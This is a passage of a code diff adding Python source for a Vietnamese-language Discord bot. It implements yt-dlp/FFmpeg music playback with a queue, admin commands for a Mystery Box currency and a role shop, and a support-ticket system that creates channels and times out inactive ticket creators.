+            "skip_download": True,
+            "source_address": "0.0.0.0",
+            "extract_flat": False,
+            "forcejson": True,
+            "http_chunk_size": 1048576,  # Tăng chunk size
+        }
+
+        print(f"[PLAY] Đang tìm kiếm: {song_query}")
+        
+        # Xử lý query
+        if song_query.startswith(('http://', 'https://', 'www.')):
+            query = song_query
+        else:
+            query = f"ytsearch1:{song_query}"
+
+        # Tìm kiếm với timeout
+        try:
+            results = await asyncio.wait_for(
+                search_ytdlp_async(query, ydl_options), 
+                timeout=15.0  # Timeout sau 15 giây
+            )
+        except asyncio.TimeoutError:
+            await search_msg.edit(content="❌ **Tìm kiếm timeout!** Vui lòng thử lại.")
+            return
+        
+        # Xử lý kết quả tìm kiếm
+        if 'entries' in results:
+            tracks = results['entries']
+            if not tracks or tracks[0] is None:
+                await search_msg.edit(content="❌ **Không tìm thấy kết quả!**")
+                return
+            first_track = tracks[0]
+        else:
+            first_track = results
+
+        # Lấy thông tin bài hát
+        audio_url = first_track.get('url')
+        title = first_track.get('title', 'Không rõ tiêu đề')
+        duration = first_track.get('duration', 'Không rõ')
+        thumbnail = first_track.get('thumbnail', '')
+
+        if not audio_url:
+            await search_msg.edit(content="❌ **Không thể lấy URL audio!**")
+            return
+
+        print(f"[PLAY] Đã tìm thấy: {title}")
+        print(f"[PLAY] Audio URL: {audio_url[:100]}...")
+
+        # Thêm vào queue
+        guild_id = str(interaction.guild_id)
+        if guild_id not in SONG_QUEUES:
+            SONG_QUEUES[guild_id] = deque()
+
+        SONG_QUEUES[guild_id].append({
+            'url': audio_url,
+            'title': title,
+            'duration': duration,
+            'thumbnail': thumbnail
+        })
+        
+        # Phát nhạc hoặc thêm vào queue
+        if voice_client.is_playing() or voice_client.is_paused():
+            embed = discord.Embed(
+                title="🎵 Đã thêm vào queue",
+                description=f"**{title}**",
+                color=discord.Color.blue()
+            )
+            if thumbnail:
+                embed.set_thumbnail(url=thumbnail)
+            await search_msg.edit(content="", embed=embed)
+        else:
+            embed = discord.Embed(
+                title="🎵 Đang phát",
+                description=f"**{title}**",
+                color=discord.Color.green()
+            )
+            if thumbnail:
+                embed.set_thumbnail(url=thumbnail)
+            await search_msg.edit(content="", embed=embed)
+            await asyncio.sleep(0.5)
+            await play_next_song(voice_client, guild_id, interaction.channel)
+
+    except asyncio.TimeoutError:
+        await search_msg.edit(content="❌ **Tìm kiếm quá lâu!** Vui lòng thử lại với từ khóa khác.")
+    except Exception as e:
+        print(f"[PLAY] Lỗi tìm kiếm/play: {e}")
+        import traceback
+        traceback.print_exc()
+        await search_msg.edit(content=f"❌ **Có lỗi xảy ra:** {str(e)[:100]}...")
+
+
+async def play_next_song(voice_client, guild_id, channel):
+    """Phát bài hát tiếp theo trong queue"""
+    try:
+        print(f"[PLAY_NEXT] Đang chuẩn bị phát bài tiếp theo cho guild {guild_id}")
+        
+        # Kiểm tra kết nối
+        if not voice_client or not voice_client.is_connected():
+            print("[PLAY_NEXT] ❌ Không có kết nối voice")
+            return
+
+        if not SONG_QUEUES.get(guild_id) or not SONG_QUEUES[guild_id]:
+            print("[PLAY_NEXT] ❌ Queue trống")
+            # Không còn bài hát trong queue
+            if voice_client.is_connected():
+                await voice_client.disconnect()
+            return
+
+        # Lấy bài hát tiếp theo
+        song_data = SONG_QUEUES[guild_id].popleft()
+        audio_url = song_data['url']
+        title = song_data['title']
+        
+        print(f"[PLAY_NEXT] Đang phát: {title}")
+
+        # FFmpeg options TỐI ƯU TỐC ĐỘ
+        ffmpeg_options = {
+            "before_options": "-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 2",
+            "options": "-vn"
+        }
+
+        try:
+            # Tạo audio source với timeout
+            source = discord.FFmpegOpusAudio(audio_url, executable=FFMPEG_PATH, **ffmpeg_options)
+            print("[PLAY_NEXT] ✅ Đã tạo audio source")
+        except asyncio.TimeoutError:
+            print("[PLAY_NEXT] ❌ Timeout tạo audio source")
+            await channel.send(f"❌ **Lỗi phát nhạc:** {title} (timeout)")
+            await play_next_song(voice_client, guild_id, channel)
+            return
+        except Exception as e:
+            print(f"[PLAY_NEXT] ❌ Lỗi tạo audio source: {e}")
+            # Thử lại với options đơn giản hơn
+            try:
+                simple_ffmpeg_options = {
+                    'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 2',
+                    'options': '-vn -c:a libopus -b:a 64k'
+                }
+                source = discord.FFmpegOpusAudio(audio_url, **simple_ffmpeg_options)
+                print("[PLAY_NEXT] ✅ Đã tạo audio source (lần 2)")
+            except Exception as e2:
+                print(f"[PLAY_NEXT] ❌ Lỗi tạo audio source lần 2: {e2}")
+                await channel.send(f"❌ **Lỗi phát nhạc:** {title}")
+                await play_next_song(voice_client, guild_id, channel)
+                return
+
+        def after_play(error):
+            print(f"[AFTER_PLAY] Callback, error: {error}")
+            if error:
+                print(f"[AFTER_PLAY] ❌ Lỗi phát nhạc: {error}")
+
+            loop = bot.loop
+            if loop.is_closed():
+                return
+
+            coro = handle_after_play(voice_client, guild_id, channel, error)
+            loop.create_task(coro)
+
+        # Kiểm tra lại kết nối trước khi phát
+        if voice_client.is_connected():
+            voice_client.play(source, after=after_play)
+            print("[PLAY_NEXT] ✅ Đã bắt đầu phát nhạc")
+            
+            # Gửi thông báo đang phát
+            embed = discord.Embed(
+                title="🎵 Đang phát",
+                description=f"**{title}**",
+                color=discord.Color.green()
+            )
+            await channel.send(embed=embed)
+        else:
+            print("[PLAY_NEXT] ❌ Mất kết nối khi chuẩn bị phát nhạc")
+                
+    except Exception as e:
+        print(f"[PLAY_NEXT] ❌ Lỗi: {e}")
+        import traceback
+        traceback.print_exc()
+
+
+async def handle_after_play(voice_client, guild_id, channel, error):
+    """Xử lý sau khi phát nhạc xong"""
+    try:
+        print(f"[HANDLE_AFTER] Bắt đầu xử lý, error: {error}")
+        
+        # Đợi một chút
+        await asyncio.sleep(1.0)
+        
+        # Kiểm tra kết nối trước khi phát bài tiếp theo
+        if voice_client and voice_client.is_connected():
+            print("[HANDLE_AFTER] Đang phát bài tiếp theo...")
+            await play_next_song(voice_client, guild_id, channel)
+        else:
+            print("[HANDLE_AFTER] ❌ Không có kết nối voice")
+            
+    except Exception as e:
+        print(f"[HANDLE_AFTER] ❌ Lỗi: {e}")
+
+
+# Event để theo dõi voice state
+@bot.event
+async def on_voice_state_update(member, before, after):
+    """Log voice state changes for debugging"""
+    if member.id == bot.user.id:
+        print(f"[VOICE_STATE] Bot voice state changed:")
+        print(f"  Before: {before.channel.name if before.channel else 'None'}")
+        print(f"  After: {after.channel.name if after.channel else 'None'}")
+        
+        # Nếu bot bị kick khỏi channel, xóa queue
+        if before.channel and not after.channel:
+            guild_id = str(before.channel.guild.id)
+            if guild_id in SONG_QUEUES:
+                SONG_QUEUES[guild_id].clear()
+                print(f"[VOICE_STATE] Đã xóa queue cho guild {guild_id}")
+
+@bot.tree.command(name="addbox", description="(Admin) Thêm Mystery Box cho user")
+async def addbox(interaction: discord.Interaction, user: discord.User, amount: int):
+    if not is_user_allowed(interaction.user.id):
+        return await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+
+    new_box = add_box(user.id, amount)
+    await interaction.response.send_message(
+        embed=discord.Embed(
+            title="✅ Đã Thêm Box",
+            description=f"Thêm {amount} box cho {user.mention}\n📦 Tổng: {new_box}",
+            color=discord.Color.green()
+        )
+    )
+    
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/addbox", guild_name, "Slash Command")
+    await send_dm_notification(user, "/addbox", guild_name, "Slash Command")
+
+
+@bot.tree.command(name="removebox", description="(Admin) Trừ Mystery Box của user")
+async def removebox(interaction: discord.Interaction, user: discord.User, amount: int):
+    if not is_user_allowed(interaction.user.id):
+        return await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+
+    new_box = remove_box(user.id, amount)
+    if new_box is None:
+        return await interaction.response.send_message("❌ User không đủ box!", ephemeral=True)
+
+    await interaction.response.send_message(
+        embed=discord.Embed(
+            title="⚠️ Đã Trừ Box",
+            description=f"Trừ {amount} box của {user.mention}\n📦 Còn lại: {new_box}",
+            color=discord.Color.orange()
+        )
+    )
+    
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/removebox", guild_name, "Slash Command")
+    await send_dm_notification(user, "/removebox", guild_name, "Slash Command")
+
+# ==================== SHOP MANAGEMENT COMMANDS ====================
+
+class ShopDropdown(discord.ui.Select):
+    def __init__(self, shop_items):
+        options = []
+        for key, item in shop_items.items():
+            options.append(discord.SelectOption(
+                label=f"{item['name']} - {item['price']} coins",
+                value=key,
+                description=f"Role ID: {item['role_id']}"
+            ))
+        
+        super().__init__(placeholder="🛒 Chọn item để quản lý...", min_values=1, max_values=1, options=options)
+
+    async def callback(self, interaction: discord.Interaction):
+        selected_key = self.values[0]
+        item = shop_data[selected_key]
+        
+        role = interaction.guild.get_role(item["role_id"])
+        
+        embed = discord.Embed(
+            title=f"🛒 Thông tin item: {item['name']}",
+            color=discord.Color.blue()
+        )
+        embed.add_field(name="💰 Giá", value=f"{item['price']} <:lonelycoin:1421380256148750429>", inline=True)
+        embed.add_field(name="👤 Role", value=role.mention if role else "Không tìm thấy", inline=True)
+        embed.add_field(name="🆔 Role ID", value=item["role_id"], inline=True)
+        embed.add_field(name="📝 Mô tả", value=item.get("description", "Không có mô tả"), inline=False)
+        
+        await interaction.response.send_message(
+            embed=embed, 
+            view=ShopActionView(selected_key), 
+            ephemeral=True
+        )
+
+class ShopDropdownView(discord.ui.View):
+    def __init__(self, shop_items):
+        super().__init__(timeout=120)
+        self.add_item(ShopDropdown(shop_items))
+
+class ShopActionView(discord.ui.View):
+    def __init__(self, item_key):
+        super().__init__(timeout=120)
+        self.item_key = item_key
+
+    @discord.ui.button(label="✏️ Chỉnh sửa", style=discord.ButtonStyle.blurple)
+    async def edit_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_modal(EditShopModal(self.item_key))
+
+    @discord.ui.button(label="🗑️ Xóa", style=discord.ButtonStyle.red)
+    async def delete_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not is_user_allowed(interaction.user.id):
+            await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+            return
+        
+        if self.item_key in shop_data:
+            del shop_data[self.item_key]
+            save_json(SHOP_FILE, shop_data)
+            
+            embed = discord.Embed(
+                title="✅ Đã xóa item",
+                description=f"Đã xóa item **{self.item_key}** khỏi shop",
+                color=discord.Color.green()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        else:
+            await interaction.response.send_message("❌ Item không tồn tại!", ephemeral=True)
+
+class EditShopModal(discord.ui.Modal, title="Chỉnh sửa Item Shop"):
+    new_name = discord.ui.TextInput(label="Tên hiển thị", placeholder="Tên item (có thể chứa emoji)", required=True)
+    new_price = discord.ui.TextInput(label="Giá", placeholder="Giá tiền (số nguyên)", required=True)
+    new_description = discord.ui.TextInput(label="Mô tả", placeholder="Mô tả item", required=False, style=discord.TextStyle.paragraph)
+
+    def __init__(self, item_key):
+        super().__init__()
+        self.item_key = item_key
+        # Pre-fill current values
+        if item_key in shop_data:
+            item = shop_data[item_key]
+            self.new_name.default = item["name"]
+            self.new_price.default = str(item["price"])
+            self.new_description.default = item.get("description", "")
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if not is_user_allowed(interaction.user.id):
+            await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+            return
+
+        if self.item_key not in shop_data:
+            await interaction.response.send_message("❌ Item không tồn tại!", ephemeral=True)
+            return
+
+        try:
+            price = int(self.new_price.value)
+            if price < 0:
+                await interaction.response.send_message("❌ Giá phải là số dương!", ephemeral=True)
+                return
+        except ValueError:
+            await interaction.response.send_message("❌ Giá phải là số hợp lệ!", ephemeral=True)
+            return
+
+        # Cập nhật thông tin
+        shop_data[self.item_key]["name"] = str(self.new_name.value)
+        shop_data[self.item_key]["price"] = price
+        shop_data[self.item_key]["description"] = str(self.new_description.value) if self.new_description.value else "No description"
+        
+        save_json(SHOP_FILE, shop_data)
+
+        embed = discord.Embed(
+            title="✅ Đã cập nhật item",
+            description=f"Đã cập nhật item **{self.item_key}**",
+            color=discord.Color.green()
+        )
+        embed.add_field(name="🆕 Tên mới", value=self.new_name.value, inline=True)
+        embed.add_field(name="💰 Giá mới", value=f"{price} <:lonelycoin:1421380256148750429>", inline=True)
+        if self.new_description.value:
+            embed.add_field(name="📝 Mô tả mới", value=self.new_description.value, inline=False)
+        
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="shop-add", description="(Admin) Thêm item mới vào shop")
+@app_commands.describe(
+    name="Tên hiển thị của item (có thể chứa emoji)",
+    role="Role sẽ được cấp khi mua item",
+    price="Giá của item",
+    description="Mô tả của item (tùy chọn)"
+)
+async def shop_add(interaction: discord.Interaction, name: str, role: discord.Role, price: int, description: str = None):
+    """Thêm item mới vào shop"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Kiểm tra xem role đã tồn tại trong shop chưa
+    for existing_key, existing_item in shop_data.items():
+        if existing_item["role_id"] == role.id:
+            embed = discord.Embed(
+                title="❌ Lỗi",
+                description=f"Role {role.mention} đã tồn tại trong shop với tên **{existing_item['name']}**!",
+                color=discord.Color.red()
+            )
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+    # Tạo key mới (dựa trên tên role, chuyển thành chữ thường và thay thế khoảng trắng)
+    new_key = role.name.lower().replace(" ", "_")
+    
+    # Đảm bảo key là duy nhất
+    counter = 1
+    original_key = new_key
+    while new_key in shop_data:
+        new_key = f"{original_key}_{counter}"
+        counter += 1
+
+    # Thêm item mới
+    shop_data[new_key] = {
+        "name": name,
+        "role_id": role.id,
+        "price": price,
+        "description": description or "No description available"
+    }
+    
+    save_json(SHOP_FILE, shop_data)
+
+    embed = discord.Embed(
+        title="✅ Đã thêm item vào shop",
+        description=f"Đã thêm item mới vào shop với key: `{new_key}`",
+        color=discord.Color.green()
+    )
+    embed.add_field(name="🆔 Key", value=new_key, inline=True)
+    embed.add_field(name="🏷️ Tên", value=name, inline=True)
+    embed.add_field(name="👤 Role", value=role.mention, inline=True)
+    embed.add_field(name="💰 Giá", value=f"{price} <:lonelycoin:1421380256148750429>", inline=True)
+    embed.add_field(name="📝 Mô tả", value=description or "Không có mô tả", inline=False)
+    
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    # Log
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, f"/shop-add name:{name} role:{role.id} price:{price}", guild_name, "Slash Command")
+    await send_dm_notification(user, f"/shop-add name:{name} role:{role.id} price:{price}", guild_name, "Slash Command")
+
+@bot.tree.command(name="shop-edit", description="(Admin) Chỉnh sửa items trong shop")
+async def shop_edit(interaction: discord.Interaction):
+    """Hiển thị danh sách items trong shop để chỉnh sửa"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    if not shop_data:
+        embed = discord.Embed(
+            title="🛒 Quản lý Shop",
+            description="Hiện chưa có item nào trong shop.\nSử dụng `/shop-add` để thêm item mới.",
+            color=discord.Color.blue()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="🛒 Quản lý Shop",
+        description="Chọn một item trong dropdown bên dưới để chỉnh sửa hoặc xóa.",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name="📊 Tổng số items", value=len(shop_data), inline=True)
+    
+    await interaction.response.send_message(
+        embed=embed, 
+        view=ShopDropdownView(shop_data), 
+        ephemeral=True
+    )
+    
+    # Log
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/shop-edit", guild_name, "Slash Command")
+    await send_dm_notification(user, "/shop-edit", guild_name, "Slash Command")
+
+@bot.tree.command(name="shop-remove", description="(Admin) Xóa item khỏi shop")
+@app_commands.describe(
+    role="Role của item cần xóa"
+)
+async def shop_remove(interaction: discord.Interaction, role: discord.Role):
+    """Xóa item khỏi shop dựa trên role"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Tìm item có role_id trùng
+    item_to_remove = None
+    item_name = None
+    
+    for item_key, item_data in shop_data.items():
+        if item_data["role_id"] == role.id:
+            item_to_remove = item_key
+            item_name = item_data["name"]
+            break
+    
+    if not item_to_remove:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description=f"Không tìm thấy item nào với role {role.mention} trong shop!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    
+    # Xóa item
+    del shop_data[item_to_remove]
+    save_json(SHOP_FILE, shop_data)
+    
+    embed = discord.Embed(
+        title="✅ Đã xóa item khỏi shop",
+        description=f"Đã xóa item **{item_name}** (key: `{item_to_remove}`) với role {role.mention}",
+        color=discord.Color.green()
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    # Log
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, f"/shop-remove role:{role.id}", guild_name, "Slash Command")
+    await send_dm_notification(user, f"/shop-remove role:{role.id}", guild_name, "Slash Command")
+    
+@bot.tree.command(name="setbox", description="(Admin) Set số Mystery Box cho user")
+async def setbox(interaction: discord.Interaction, user: discord.User, amount: int):
+    if not is_user_allowed(interaction.user.id):
+        return await interaction.response.send_message("❌ Bạn không có quyền!", ephemeral=True)
+
+    new_box = set_box(user.id, amount)
+    await interaction.response.send_message(
+        embed=discord.Embed(
+            title="🔧 Đặt Box",
+            description=f"Số Mystery Box của {user.mention} = {new_box}",
+            color=discord.Color.blue()
+        )
+    )
+    
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/setbox", guild_name, "Slash Command")
+    await send_dm_notification(user, "/setbox", guild_name, "Slash Command")
+    
+# -------------------
+# Ticket Button + View (tạo channel)
+# -------------------
+class TicketButton(discord.ui.Button):
+    def __init__(self, setup):
+        super().__init__(label=setup["label"], style=discord.ButtonStyle.green)
+        self.setup = setup
+
+    async def callback(self, interaction: discord.Interaction):
+        guild = interaction.guild
+        cat_id = self.setup.get("category_id")
+        category = guild.get_channel(cat_id) if cat_id else None
+
+        if category is None or not isinstance(category, discord.CategoryChannel):
+            return await interaction.response.send_message(
+                embed=discord.Embed(title="❌ Category không hợp lệ", description="Vui lòng kiểm tra category trong setup.", color=discord.Color.red()),
+                ephemeral=True
+            )
+
+        safe_name = interaction.user.name.strip().replace(" ", "-")[:90]
+        channel_name = f"ticket-{safe_name}"
+
+        overwrites = {
+            guild.default_role: discord.PermissionOverwrite(view_channel=False),
+            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
+            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True),
+        }
+
+        try:
+            channel = await guild.create_text_channel(
+                name=channel_name,
+                overwrites=overwrites,
+                category=category
+            )
+        except Exception as e:
+            return await interaction.response.send_message(
+                embed=discord.Embed(title="❌ Không thể tạo kênh", description=str(e), color=discord.Color.red()),
+                ephemeral=True
+            )
+
+        add_ticket(channel.id, interaction.user.id)
+
+        ticket_embed = discord.Embed(
+            title="🎫 Ticket Mới",
+            description=f"Xin chào {interaction.user.mention}, staff sẽ sớm hỗ trợ bạn.\nVui lòng mô tả vấn đề của bạn ở đây.",
+            color=discord.Color.green()
+        )
+        await channel.send(embed=ticket_embed)
+
+        role_pings = []
+        for rid in self.setup.get("roles", []):
+            r = guild.get_role(rid)
+            if r:
+                role_pings.append(r.mention)
+        if role_pings:
+            await channel.send(" ".join(role_pings))
+
+        await channel.send("🔒 Nhấn nút dưới để đóng ticket:", view=CloseTicketView())
+
+        await interaction.response.send_message(
+            embed=discord.Embed(title="✅ Ticket đã được tạo", description=f"Ticket: {channel.mention}", color=discord.Color.green()),
+            ephemeral=True
+        )
+
+        if LOG_CHANNEL_ID:
+            lc = guild.get_channel(LOG_CHANNEL_ID)
+            if lc:
+                log_embed = discord.Embed(
+                    title="🎫 Ticket Được Tạo",
+                    description=f"Người tạo: {interaction.user.mention}\nLoại: **{self.setup['label']}**\nKênh: {channel.mention}",
+                    color=discord.Color.green()
+                )
+                await lc.send(embed=log_embed)
+
+class TicketView(discord.ui.View):
+    def __init__(self, setups: List[dict]):
+        super().__init__(timeout=None)
+        for s in setups:
+            self.add_item(TicketButton(s))
+            
+# -------------------
+# Background check (mute if ticket inactive 6h)
+# -------------------
+@tasks.loop(minutes=5)
+async def check_tickets():
+    data = load_ticket_json(TICKET_DATA, {})
+    now = datetime.datetime.utcnow()
+
+    for channel_id, info in list(data.items()):
+        try:
+            created = datetime.datetime.fromisoformat(info["created_at"])
+        except Exception:
+            continue
+        user_id = info["user_id"]
+        active = info.get("active", False)
+
+        if not active and (now - created).total_seconds() > 6 * 3600:
+            for guild in bot.guilds:
+                member = guild.get_member(int(user_id))
+                if member:
+                    try:
+                        until = discord.utils.utcnow() + datetime.timedelta(days=1)
+                        await member.timeout(until, reason="Spam ticket không có lý do")
+                        if LOG_CHANNEL_ID:
+                            log_channel = guild.get_channel(LOG_CHANNEL_ID)
+                            if log_channel:
+                                await log_channel.send(embed=discord.Embed(
+                                    title="⚠️ Cảnh cáo",
+                                    description=f"{member.mention} đã bị mute 1 ngày vì tạo ticket không có lý do!",
+                                    color=discord.Color.red()
+                                ))
+                    except Exception as e:
+                        print(f"Lỗi mute: {e}")
+            del data[channel_id]
+    save_ticket_json(TICKET_DATA, data)
+    
+# -------------------
+# Dropdown + action views for /setup-list
+# -------------------
+class SetupDropdown(discord.ui.Select):
+    def __init__(self, setups):
+        options = []
+        for s in setups:
+            label = s.get("label", "No label")
+            enabled = s.get("enabled", False)
+            display = f"{label} ({'✅' if enabled else '❌'})"
+            options.append(discord.SelectOption(label=display, value=s["id"]))
+        super().__init__(placeholder="Chọn setup...", min_values=1, max_values=1, options=options)
+
+    async def callback(self, interaction: discord.Interaction):
+        cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+        sid = self.values[0]
+        setup = next((x for x in cfg["setups"] if x["id"] == sid), None)
+        if not setup:
+            return await interaction.response.send_message("❌ Setup không tồn tại.", ephemeral=True)
+
+        roles_text = ', '.join([f'<@&{r}>' for r in setup.get("roles", [])]) if setup.get("roles") else "Không có"
+        category_mention = f"<#{setup['category_id']}>" if setup.get("category_id") else "Không có"
+
+        embed = discord.Embed(
+            title=f"⚙️ Setup: {setup['label']}",
+            description=f"**Roles:** {roles_text}\n**Category:** {category_mention}\n**Trạng thái:** {'✅ Enabled' if setup.get('enabled') else '❌ Disabled'}",
+            color=discord.Color.green()
+        )
+        await interaction.response.send_message(embed=embed, view=SetupActionView(setup["id"]), ephemeral=True)
+
+
+class SetupDropdownView(discord.ui.View):
+    def __init__(self, setups):
+        super().__init__(timeout=120)
+        self.add_item(SetupDropdown(setups))
+
+
+class SetupActionView(discord.ui.View):
+    def __init__(self, setup_id):
+        super().__init__(timeout=120)
+        self.setup_id = setup_id
+
+    @discord.ui.button(label="✅ Enable", style=discord.ButtonStyle.green)
+    async def enable_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.user.guild_permissions.administrator:
+            return await interaction.response.send_message("❌ Chỉ admin.", ephemeral=True)
+        cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+        found = False
+        for s in cfg["setups"]:
+            if s["id"] == self.setup_id:
+                s["enabled"] = True
+                found = True
+            else:
+                s["enabled"] = False
+        if not found:
+            return await interaction.response.send_message("❌ Setup không tồn tại.", ephemeral=True)
+        save_ticket_json(CONFIG_FILE, cfg)
+        await interaction.response.send_message("✅ Setup đã được bật (và tắt các setup khác).", ephemeral=True)
+
+    @discord.ui.button(label="📝 Edit", style=discord.ButtonStyle.blurple)
+    async def edit_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.user.guild_permissions.administrator:
+            return await interaction.response.send_message("❌ Chỉ admin.", ephemeral=True)
+        await interaction.response.send_modal(EditSetupModal(self.setup_id))
+
+    @discord.ui.button(label="❌ Delete", style=discord.ButtonStyle.red)
+    async def delete_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.user.guild_permissions.administrator:
+            return await interaction.response.send_message("❌ Chỉ admin.", ephemeral=True)
+        cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+        cfg["setups"] = [s for s in cfg.get("setups", []) if s["id"] != self.setup_id]
+        save_ticket_json(CONFIG_FILE, cfg)
+        await interaction.response.send_message("🗑️ Setup đã bị xoá.", ephemeral=True)
+        
+# -------------------
+# Modal để edit setup
+# -------------------
+class EditSetupModal(discord.ui.Modal, title="Chỉnh sửa Setup"):
+    new_label = discord.ui.TextInput(label="Label", placeholder="Tên nút", required=True, max_length=100)
+    new_roles = discord.ui.TextInput(label="Roles", placeholder="@role1 @role2 hoặc 111 222", required=False)
+    new_category = discord.ui.TextInput(label="Category ID", placeholder="ID category", required=False)
+
+    def __init__(self, setup_id):
+        super().__init__()
+        self.setup_id = setup_id
+
+    async def on_submit(self, interaction: discord.Interaction):
+        if not interaction.user.guild_permissions.administrator:
+            return await interaction.response.send_message("❌ Chỉ admin.", ephemeral=True)
+
+        cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+        setup = next((s for s in cfg["setups"] if s["id"] == self.setup_id), None)
+        if not setup:
+            return await interaction.response.send_message("❌ Setup không tồn tại.", ephemeral=True)
+
+        setup["label"] = str(self.new_label.value).strip()
+        setup["roles"] = parse_role_string(self.new_roles.value)
+        try:
+            if self.new_category.value:
+                setup["category_id"] = int(self.new_category.value)
+        except:
+            setup["category_id"] = None
+
+        save_ticket_json(CONFIG_FILE, cfg)
+        await interaction.response.send_message("✅ Setup đã được chỉnh sửa.", ephemeral=True)
+        
+# -------------------
+# /setup command (admin)
+# -------------------
+@bot.tree.command(name="setup", description="Tạo 1 setup button ticket (admin)")
+@app_commands.describe(
+    label="Tên nút (ví dụ: Hỗ Trợ)",
+    roles="Danh sách role để ping (ví dụ: @Support @Mod hoặc 111111111111 2222222222)",
+    category="Category chứa ticket"
+)
+async def setup_cmd(interaction: discord.Interaction, label: str, roles: str, category: discord.CategoryChannel):
+    if not interaction.user.guild_permissions.administrator:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+        
+    cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+    rid_list = parse_role_string(roles)
+    setup_id = str(uuid.uuid4())[:8]
+
+    new_setup = {
+        "id": setup_id,
+        "label": label,
+        "roles": rid_list,
+        "category_id": category.id if category else None,
+        "enabled": False
+    }
+    cfg.setdefault("setups", []).append(new_setup)
+    save_ticket_json(CONFIG_FILE, cfg)
+
+    await interaction.response.send_message(embed=discord.Embed(
+        title="✅ Setup đã được tạo",
+        description=f"ID: `{setup_id}`\nLabel: **{label}**\nRoles: {' '.join([f'<@&{r}>' for r in rid_list]) if rid_list else 'Không có'}\nCategory: {category.mention}",
+        color=discord.Color.green()
+    ), ephemeral=True)
+
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/setup", guild_name, "Slash Command")
+    await send_dm_notification(user, "/setup", guild_name, "Slash Command")
+    
+# -------------------
+# /taoticket command
+# -------------------
+@bot.tree.command(name="ticket", description="Gửi menu ticket đã setup (chỉ hiện setup enabled)")
+async def taoticket(interaction: discord.Interaction):
+    if not interaction.user.guild_permissions.administrator:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+        
+    cfg = load_ticket_json(CONFIG_FILE, {"setups": []})
+    setups = [s for s in cfg.get("setups", []) if s.get("enabled")]
+    if not setups:
+        return await interaction.response.send_message(embed=discord.Embed(title="❌ Không có setup enabled", description="Bạn cần bật 1 setup bằng /setup-list", color=discord.Color.red()), ephemeral=True)
+
+    embed = discord.Embed(title="🎫 Menu Ticket", description="Nhấn nút bên dưới để tạo ticket.", color=discord.Color.blurple())
+    await interaction.channel.send(embed=embed, view=TicketView(setups))
+    await interaction.response.send_message(embed=discord.Embed(title="✅ Menu ticket đã gửi", color=discord.Color.green()), ephemeral=True)
+
+    # 📌 Log + gửi DM sau khi đã phản hồi
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, "/ticket", guild_name, "Slash Command")
